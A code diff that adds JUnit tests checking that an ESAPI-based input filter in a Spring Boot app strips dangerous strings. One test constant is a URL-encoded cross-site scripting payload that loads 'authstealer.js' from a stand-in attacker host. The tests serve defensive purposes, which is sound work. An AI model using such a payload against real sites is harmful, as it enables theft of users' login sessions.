@@ -4,6 +4,7 @@ import static org.junit.Assert.assertEquals;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.net.URL;
 import java.util.ArrayList;
 import java.util.List;
 import org.apache.http.NameValuePair;
@@ -35,6 +36,11 @@ import org.springframework.test.context.junit4.SpringRunner;
 @SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
 public class EsapiFilterTest {
 
+  public static final String IMG_SRC = "<img src=\"C:\\Documents and Settings\\screenshots\\Image01.png\"/>";
+  public static final String PERCENT_STRING = "%2520";
+  public static final String DOUBLE_BACKSLASH = "Hello\\\\ there";
+  public static final String URL_STRING = "https://www.host.com:8080/evidence?x=y&%2520";
+  public static final String URL_NASTY_STRING = "http://bobssite.org?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E";
   public static final String NASTY_STRING = "<script>console.log('fred');</script>But this is ok";
   public static final String GOOD_STRING = "nothing bad in here";
 
@@ -64,6 +70,48 @@ public class EsapiFilterTest {
 
     String moreContentAsString = postData(NASTY_STRING, client, httpContext);
     assertEquals("But this is ok", moreContentAsString);
+    client.close();
+  }
+
+  @Test
+  public void shouldCleanImageSrc() throws IOException {
+
+    String moreContentAsString = postData(IMG_SRC, client, httpContext);
+    assertEquals("<img />", moreContentAsString);
+    client.close();
+  }
+
+  @Test
+  public void shouldCleanEncoded() throws IOException {
+
+    String moreContentAsString = postData(PERCENT_STRING, client, httpContext);
+    assertEquals("%2520", moreContentAsString);
+    client.close();
+  }
+
+  @Test
+  public void shouldNotCleanUrl() throws IOException {
+
+    String moreContentAsString = postData(URL_STRING, client, httpContext);
+    assertEquals(URL_STRING, moreContentAsString);
+    client.close();
+  }
+
+
+  @Test
+  public void shouldCleanEncodedUrl() throws IOException {
+
+    String moreContentAsString = postData(URL_NASTY_STRING, client, httpContext);
+    assertEquals("", moreContentAsString);
+    client.close();
+  }
+
+
+  @Test
+  public void shouldCleanDoubleBackslash() throws IOException {
+
+    String moreContentAsString = postData(DOUBLE_BACKSLASH, client, httpContext);
+    assertEquals("", moreContentAsString);
     client.close();
   }
 
